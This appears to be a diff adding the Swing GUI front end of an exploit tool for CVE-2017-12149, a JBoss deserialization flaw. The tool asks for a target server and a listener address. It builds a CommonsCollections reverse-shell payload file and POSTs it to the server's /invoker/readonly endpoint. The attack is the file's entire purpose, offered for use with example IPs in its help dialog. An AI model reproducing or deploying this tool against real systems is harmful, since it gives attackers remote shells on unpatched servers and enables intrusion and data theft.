@@ -1,0 +1,116 @@
+package com.jboss.main;
+
+import java.awt.Container;
+import java.awt.Dimension;
+import java.awt.FlowLayout;
+import java.awt.GridLayout;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.util.ArrayList;
+import java.util.List;
+
+import javax.swing.JButton;
+import javax.swing.JFrame;
+import javax.swing.JLabel;
+import javax.swing.JOptionPane;
+import javax.swing.JRootPane;
+import javax.swing.JTextArea;
+import javax.swing.JTextField;
+import javax.swing.UIManager;
+import javax.swing.UnsupportedLookAndFeelException;
+
+
+public class MainAPP extends JFrame {
+	JLabel server_lab = new JLabel("jboss ip/port:");
+	JTextField server = new JTextField(25);
+	JLabel local_ip_lab = new JLabel("shell  ip/port:");
+	JTextField local_ip = new JTextField(25);
+	JButton btn = new JButton("Send");
+	JButton help = new JButton("Read Me");
+	
+	public MainAPP() {
+		setUndecorated(true);
+		setDefaultCloseOperation(3);
+		setFocusableWindowState(true);
+		JRootPane rp = getRootPane();
+		setVisible(true);
+		this.setTitle("CVE-2017-12149 JBOSS as 6.X反序列化(反弹shell版) By:Sevck");
+		this.setSize(560, 230);// 宽度
+		this.setResizable(false);
+		this.setLocationRelativeTo(null);
+		rp.setWindowDecorationStyle(JRootPane.FRAME);
+		init();
+	}
+	
+	public void init() {
+		Container cp = this.getContentPane();
+		this.setLayout(new FlowLayout(FlowLayout.LEFT,20,40));// 布局
+		cp.add(server_lab);
+		cp.add(server);
+		cp.add(btn);
+		cp.add(local_ip_lab);
+		cp.add(local_ip);
+		cp.add(help);
+		btn.addActionListener(new ActionListener() {
+			
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				btn_startActionPerformed(e);
+				
+			}
+		});
+		help.addActionListener(new ActionListener() {
+			
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				JOptionPane.showMessageDialog(null, "jboss:192.168.197.25:8080\r\nshell:192.168.197.12:1234");
+				
+			}
+		});
+	}
+	private void btn_startActionPerformed(ActionEvent evt) {
+		String jboss_ip = this.server.getText(); // �����IP
+		String local_ip = this.local_ip.getText(); //����ip/port
+		if (jboss_ip.equalsIgnoreCase("") || local_ip.equalsIgnoreCase("")){
+			String msg = "JBoss服务器和反弹IP端口字段不能为空";
+			JOptionPane.showMessageDialog(null, msg);
+			return ;
+		}
+		String msg = "";
+		// 生成payload
+		Payload payload = new Payload();
+		String result = null;
+		try {
+			 result = payload.PayloadGeneration(local_ip);
+		}catch (Exception e) {  
+			JOptionPane.showMessageDialog(null, e.getMessage());
+	    }
+		String fileName = "ReverseShellCommonsCollectionsHashMap.ser";
+		String filePath = System.getProperty("user.dir")+"\\ReverseShellCommonsCollectionsHashMap.ser";
+		System.out.println(filePath);
+		doPost.DoPost("http://"+jboss_ip+"/invoker/readonly", filePath,fileName);
+		JOptionPane.showMessageDialog(null, "just do it.");
+	}
+	
+	public static void main(String[] args) {
+		// LookAndFeel
+				System.setProperty("Quaqua.tabLayoutPolicy", "wrap");
+
+				try {
+					UIManager.setLookAndFeel(ch.randelshofer.quaqua.QuaquaManager
+							.getLookAndFeel());
+				} catch (UnsupportedLookAndFeelException e) {
+					// TODO Auto-generated catch block
+				}
+				new MainAPP();
+
+
+	}
+
+}
